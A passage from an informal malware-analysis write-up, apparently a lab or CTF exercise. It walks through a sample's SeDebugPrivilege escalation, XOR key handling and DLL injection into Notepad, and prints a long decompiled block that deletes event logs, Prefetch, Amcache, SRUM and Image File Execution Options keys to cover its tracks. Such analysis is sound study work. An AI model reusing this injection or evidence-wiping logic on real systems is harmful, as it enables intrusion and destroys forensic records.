@@ -573,4 +573,382 @@ I spotted the malware using  a function  for privilage escalation  .
 
 This function enables SeDebugPrivilege for the current process by opening the process token, looking up the SeDebugPrivilege LUID, and calling AdjustTokenPrivileges to turn it on. Enabling that privilege lets the program open and manipulate other processes, including system-owned ones, which malware commonly uses to inject code, read memory (for credential theft), or tamper with protected processes. The sequence is a classic first step in process injection and privilege escalation.
 
+<img width="1918" height="862" alt="image" src="https://github.com/user-attachments/assets/89b079a2-48d2-484b-ac76-28ad0c388097" />
 
+In short this does - K32EnumProcesses() → K32EnumProcessModules() → K32GetModuleFileNameExA()
+MultiByteToWideChar() → FUN_140031c70(L"Notepad.exe") , im guessing this is to store , its process ID for later injection . 
+
+
+<img width="804" height="449" alt="image" src="https://github.com/user-attachments/assets/0f062d7a-4132-406b-95ce-1afbfe969bb2" />
+
+
+Retrieves encryption key from environment variable "AZRAEL" , XORs the key with 0x33
+
+<img width="885" height="525" alt="image" src="https://github.com/user-attachments/assets/3637e2fa-513a-450b-83dc-6300e99edf03" />
+
+
+Opens C:\confidential.bin for reading -> Creates C:\Windows\windowsupdate.bin for output
+
+Im not sure right now about whats being done next but an XOR is happening tho and it's doing twice ? 
+
+
+<img width="949" height="483" alt="image" src="https://github.com/user-attachments/assets/1dc858e9-0530-4651-af9a-5a315ece671b" />
+
+Classic DLL injection ah . Opens Notepad process with full access ->Allocates memory in Notepad's address space->Writes path to malicious DLL: Msrct.dll->Creates remote thread to load the DLL
+
+
+Then the malware tries to hide itself by deleating everything 
+```c
+
+                CloseHandle(pvVar10);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002ba6;
+                FUN_140073680();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002bc6;
+                FUN_1400a8620((longlong *)(&stack0x000003a0 + lVar3),
+                              "C:\\Windows\\AppCompat\\Programs\\amcache.hve");
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002bd5;
+                FUN_1400736b0();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002be4;
+                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x000003a0 + lVar3));
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002bec;
+                remove(pcVar12);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002bfb;
+                FUN_140073680();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002c1b;
+                FUN_1400a8620((longlong *)(&stack0x00000380 + lVar3),
+                              "C:\\Windows\\AppCompat\\Programs\\ShimCache.sys");
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002c2a;
+                FUN_1400736b0();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002c39;
+                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x00000380 + lVar3));
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002c41;
+                remove(pcVar12);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002c50;
+                FUN_140073680();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002c70;
+                FUN_1400a8620((longlong *)(&stack0x00000360 + lVar3),"C:\\Windows\\Prefetch");
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002c7f;
+                FUN_1400736b0();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002c8e;
+                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x00000360 + lVar3));
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002c96;
+                remove(pcVar12);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002ca5;
+                FUN_140073680();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002cc5;
+                FUN_1400a8620((longlong *)(&stack0x00000340 + lVar3),
+                              "C:\\Windows\\System32\\winevt\\Logs");
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002cd4;
+                FUN_1400736b0();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002ce3;
+                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x00000340 + lVar3));
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002ceb;
+                remove(pcVar12);
+                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =
+                     &stack0x00000338 + lVar3;
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002d1d;
+                RegOpenKeyExA((HKEY)0xffffffff80000002,
+                              "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution  Options"
+                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));
+                pHVar2 = *(HKEY *)(&stack0x00000338 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002d43;
+                RegDeleteKeyExA(pHVar2,"notepad.exe",0x100,0);
+                pHVar2 = *(HKEY *)(&stack0x00000338 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002d69;
+                RegDeleteKeyExA(pHVar2,"notepad.exe",0x200,0);
+                pHVar2 = *(HKEY *)(&stack0x00000338 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002d7c;
+                RegCloseKey(pHVar2);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002d81;
+                FUN_140001e00();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002d86;
+                FUN_140001eed();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002d8b;
+                FUN_140001fd0();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002d9a;
+                remove("C:\\confidential.bin");
+                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =
+                     &stack0x00000330 + lVar3;
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002dcc;
+                RegOpenKeyExW((HKEY)0xffffffff80000002,
+                              L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Executio n Options"
+                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));
+                pHVar2 = *(HKEY *)(&stack0x00000330 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002df2;
+                RegDeleteKeyExW(pHVar2,L"notepad.exe",0x100,0);
+                pHVar2 = *(HKEY *)(&stack0x00000330 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002e18;
+                RegDeleteKeyExW(pHVar2,L"notepad.exe",0x200,0);
+                pHVar2 = *(HKEY *)(&stack0x00000330 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002e2b;
+                RegCloseKey(pHVar2);
+                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =
+                     &stack0x00000328 + lVar3;
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002e5d;
+                RegOpenKeyExA((HKEY)0xffffffff80000002,
+                              "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution  Options"
+                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));
+                pHVar2 = *(HKEY *)(&stack0x00000328 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002e77;
+                RegDeleteKeyA(pHVar2,"notepad.exe");
+                pHVar2 = *(HKEY *)(&stack0x00000328 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002e8a;
+                RegCloseKey(pHVar2);
+                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =
+                     &stack0x00000320 + lVar3;
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002ebc;
+                RegOpenKeyExW((HKEY)0xffffffff80000002,
+                              L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Executio n Options"
+                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));
+                pHVar2 = *(HKEY *)(&stack0x00000320 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002ed6;
+                RegDeleteKeyW(pHVar2,L"notepad.exe");
+                pHVar2 = *(HKEY *)(&stack0x00000320 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002ee9;
+                RegCloseKey(pHVar2);
+                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =
+                     &stack0x00000318 + lVar3;
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002f1b;
+                RegOpenKeyExA((HKEY)0xffffffff80000002,
+                              "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution  Options"
+                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));
+                pHVar2 = *(HKEY *)(&stack0x00000318 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002f35;
+                RegDeleteValueA(pHVar2,"notepad.exe");
+                pHVar2 = *(HKEY *)(&stack0x00000318 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002f48;
+                RegCloseKey(pHVar2);
+                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =
+                     &stack0x00000310 + lVar3;
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002f7a;
+                RegOpenKeyExW((HKEY)0xffffffff80000002,
+                              L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Executio n Options"
+                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));
+                pHVar2 = *(HKEY *)(&stack0x00000310 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002f94;
+                RegDeleteValueW(pHVar2,L"notepad.exe");
+                pHVar2 = *(HKEY *)(&stack0x00000310 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002fa7;
+                RegCloseKey(pHVar2);
+                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =
+                     &stack0x00000308 + lVar3;
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002fd9;
+                RegOpenKeyExA((HKEY)0xffffffff80000002,
+                              "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution  Options"
+                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));
+                pHVar2 = *(HKEY *)(&stack0x00000308 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002ff3;
+                RegDeleteTreeA(pHVar2,"notepad.exe");
+                pHVar2 = *(HKEY *)(&stack0x00000308 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003006;
+                RegCloseKey(pHVar2);
+                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =
+                     &stack0x00000300 + lVar3;
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003038;
+                RegOpenKeyExW((HKEY)0xffffffff80000002,
+                              L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Executio n Options"
+                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));
+                pHVar2 = *(HKEY *)(&stack0x00000300 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003052;
+                RegDeleteTreeW(pHVar2,L"notepad.exe");
+                pHVar2 = *(HKEY *)(&stack0x00000300 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003065;
+                RegCloseKey(pHVar2);
+                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =
+                     &stack0x000002f8 + lVar3;
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003097;
+                RegOpenKeyExA((HKEY)0xffffffff80000002,
+                              "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution  Options"
+                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));
+                pHVar2 = *(HKEY *)(&stack0x000002f8 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400030b1;
+                RegDeleteTreeA(pHVar2,"notepad.exe");
+                pHVar2 = *(HKEY *)(&stack0x000002f8 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400030c4;
+                RegCloseKey(pHVar2);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400030d3;
+                FUN_140073680();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400030f3;
+                FUN_1400a8620((longlong *)(&stack0x000002d0 + lVar3),
+                              "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Temp\\* "
+                             );
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003102;
+                FUN_1400736b0();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003111;
+                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x000002d0 + lVar3));
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003119;
+                remove(pcVar12);
+                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =
+                     &stack0x000002c8 + lVar3;
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000314b;
+                RegOpenKeyExA((HKEY)0xffffffff80000002,
+                              "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Comp atibility Assistant\\Store"
+                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));
+                pHVar2 = *(HKEY *)(&stack0x000002c8 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003165;
+                RegDeleteValueA(pHVar2,"BAM");
+                pHVar2 = *(HKEY *)(&stack0x000002c8 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003178;
+                RegCloseKey(pHVar2);
+                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =
+                     &stack0x000002c0 + lVar3;
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400031aa;
+                RegOpenKeyExA((HKEY)0xffffffff80000002,
+                              "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Comp atibility Assistant\\Store"
+                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));
+                pHVar2 = *(HKEY *)(&stack0x000002c0 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400031c4;
+                RegDeleteValueA(pHVar2,"DAM");
+                pHVar2 = *(HKEY *)(&stack0x000002c0 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400031d7;
+                RegCloseKey(pHVar2);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400031e6;
+                FUN_140073680();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003206;
+                FUN_1400a8620((longlong *)(&stack0x000002a0 + lVar3),
+                              "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microso ft\\Windows\\History\\History.IE5\\ActivitiesCache.db"
+                             );
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003215;
+                FUN_1400736b0();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003224;
+                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x000002a0 + lVar3));
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000322c;
+                remove(pcVar12);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000323b;
+                FUN_140073680();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000325b;
+                FUN_1400a8620((longlong *)(&stack0x00000280 + lVar3),
+                              "C:\\Windows\\System32\\SRUM\\SRUM.DAT");
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000326a;
+                FUN_1400736b0();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003279;
+                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x00000280 + lVar3));
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003281;
+                remove(pcVar12);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003290;
+                FUN_140073680();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400032b0;
+                FUN_1400a8620((longlong *)(&stack0x00000260 + lVar3),
+                              "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microso ft\\Windows\\UsrClass.dat"
+                             );
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400032bf;
+                FUN_1400736b0();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400032ce;
+                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x00000260 + lVar3));
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400032d6;
+                remove(pcVar12);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400032e5;
+                FUN_140073680();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003305;
+                FUN_1400a8620((longlong *)(&stack0x00000240 + lVar3),
+                              "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microso ft\\Windows\\Explorer\\ComDlg32.dll.mui"
+                             );
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003314;
+                FUN_1400736b0();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003323;
+                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x00000240 + lVar3));
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000332b;
+                remove(pcVar12);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000333a;
+                FUN_140073680();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000335a;
+                FUN_1400a8620((longlong *)(&stack0x00000220 + lVar3),
+                              "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microso ft\\Windows\\Explorer\\RunMRU"
+                             );
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003369;
+                FUN_1400736b0();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003378;
+                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x00000220 + lVar3));
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003380;
+                remove(pcVar12);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000338f;
+                FUN_140073680();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400033af;
+                FUN_1400a8620((longlong *)(&stack0x00000200 + lVar3),
+                              "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microso ft\\Windows\\Explorer\\AutomaticDestinations"
+                             );
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400033be;
+                FUN_1400736b0();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400033cd;
+                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x00000200 + lVar3));
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400033d5;
+                remove(pcVar12);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400033e4;
+                FUN_140073680();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003404;
+                FUN_1400a8620((longlong *)(&stack0x000001e0 + lVar3),
+                              "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microso ft\\Windows\\Explorer\\RecentPlaces"
+                             );
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003413;
+                FUN_1400736b0();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003422;
+                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x000001e0 + lVar3));
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000342a;
+                remove(pcVar12);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003439;
+                FUN_140073680();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003459;
+                FUN_1400a8620((longlong *)(&stack0x000001c0 + lVar3),
+                              "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microso ft\\Windows\\Explorer\\WindowsSearch"
+                             );
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003468;
+                FUN_1400736b0();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003477;
+                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x000001c0 + lVar3));
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000347f;
+                remove(pcVar12);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000348e;
+                FUN_140073680();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400034ae;
+                FUN_1400a8620((longlong *)(&stack0x000001a0 + lVar3),
+                              "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microso ft\\Windows\\Explorer\\WindowsSearch"
+                             );
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400034bd;
+                FUN_1400736b0();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400034cc;
+                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x000001a0 + lVar3));
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400034d4;
+                remove(pcVar12);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400034e3;
+                FUN_140073680();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003503;
+                FUN_1400a8620((longlong *)(&stack0x00000180 + lVar3),
+                              "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microso ft\\Windows\\Explorer\\thumbs.db"
+                             );
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003512;
+                FUN_1400736b0();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003521;
+                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x00000180 + lVar3));
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003529;
+                remove(pcVar12);
+                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =
+                     &stack0x00000178 + lVar3;
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000355b;
+                RegOpenKeyExA((HKEY)0xffffffff80000002,
+                              "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution  Options"
+                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));
+                pHVar2 = *(HKEY *)(&stack0x00000178 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003575;
+                RegDeleteValueA(pHVar2,"confidential.bin");
+                pHVar2 = *(HKEY *)(&stack0x00000178 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003588;
+                RegCloseKey(pHVar2);
+                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =
+                     &stack0x00000170 + lVar3;
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400035ba;
+                RegOpenKeyExW((HKEY)0xffffffff80000002,
+                              L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Executio n Options"
+                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));
+                pHVar2 = *(HKEY *)(&stack0x00000170 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400035d4;
+                RegDeleteValueW(pHVar2,L"confidential.bin");
+                pHVar2 = *(HKEY *)(&stack0x00000170 + lVar3);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400035e7;
+                RegCloseKey(pHVar2);
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400035f6;
+                FUN_140073680();
+                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003616;
+                FUN_1400a8620((longlong *)(&stack0x00000150 + lVar3),
+                              "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Temp\\* "
+                             );
+```
